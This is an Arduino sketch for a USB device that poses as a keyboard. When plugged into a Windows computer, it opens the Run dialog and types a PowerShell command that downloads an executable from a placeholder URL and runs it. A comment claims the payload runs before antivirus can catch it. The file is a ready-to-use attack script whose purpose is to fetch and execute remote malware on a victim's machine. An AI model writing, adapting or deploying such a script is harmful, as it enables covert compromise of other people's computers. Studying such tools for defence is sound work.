#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // This is a script to download and exexute Windows Payload(.exe)
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI );
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  //If any antivirus is enabled in the target computer, it will detect the Payload. But the payload gets executed before the antivirus can detect the payload.
  Keyboard.print(F("powershell Invoke-WebRequest -Uri '<PAYLOAD URL HERE>' -OutFile <DOWNLOAD LOCATION>;powershell <DOWNLOAD LOCATION>"));

  typeKey(KEY_RETURN);
  delay(6000);
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
